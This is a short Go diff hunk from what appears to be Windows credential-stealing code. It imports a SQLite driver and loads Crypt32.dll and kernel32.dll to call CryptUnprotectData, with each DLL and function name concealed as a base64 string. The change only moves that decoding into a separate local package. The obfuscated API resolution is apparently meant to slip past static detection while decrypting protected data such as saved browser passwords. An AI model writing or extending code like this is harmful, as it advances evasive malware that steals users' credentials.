@@ -5,17 +5,17 @@ import (
 	"os"
 	"syscall"
 	"unsafe"
-
+	"../base64"
 	_ "github.com/mattn/go-sqlite3"
 )
 
 const CRYPTPROTECT_UI_FORBIDDEN = 0x1
 
 var (
-	dllcrypt32      = syscall.NewLazyDLL(Base64Decode("Q3J5cHQzMi5kbGw="))         //Crypt32.dll
-	dllkernel32     = syscall.NewLazyDLL(Base64Decode("a2VybmVsMzIuZGxs"))         //kernel32.dll
-	procDecryptData = dllcrypt32.NewProc(Base64Decode("Q3J5cHRVbnByb3RlY3REYXRh")) //CryptUnprotectData
-	procLocalFree   = dllkernel32.NewProc(Base64Decode("TG9jYWxGcmVl"))            //LocalFree
+	dllcrypt32      = syscall.NewLazyDLL(base64.Base64Decode("Q3J5cHQzMi5kbGw="))         //Crypt32.dll
+	dllkernel32     = syscall.NewLazyDLL(base64.Base64Decode("a2VybmVsMzIuZGxs"))         //kernel32.dll
+	procDecryptData = dllcrypt32.NewProc(base64.Base64Decode("Q3J5cHRVbnByb3RlY3REYXRh")) //CryptUnprotectData
+	procLocalFree   = dllkernel32.NewProc(base64.Base64Decode("TG9jYWxGcmVl"))            //LocalFree
 )
 
 type DATA_BLOB struct {
